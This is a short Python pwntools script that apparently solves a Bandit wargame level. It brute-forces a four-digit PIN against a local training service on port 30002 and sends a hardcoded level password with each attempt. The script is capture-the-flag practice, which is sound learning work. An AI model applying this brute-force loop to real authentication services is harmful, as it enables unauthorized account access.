from pwn import *


wrong_code = "Wrong! Please enter the correct pincode. Try again."
exit_code = "Timeout. Exiting."
bandit24_pass = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
conn = remote("localhost",30002)

msg = conn.recvline()
print(msg)

for i in range(10000,0,-1):
    pin = str(i).zfill(4) #zfill prefix four zeros
    payload = bandit24_pass + " " + pin

    print("Attempt: %s",payload)
    conn.sendline(payload)
    msg2 = conn.recvline(keepends=False)
    print(msg2)
    # if(msg2 != wrong_code):
    if("Wrong!" not in msg2):
        break
print(msg2)
print(conn.recvline())






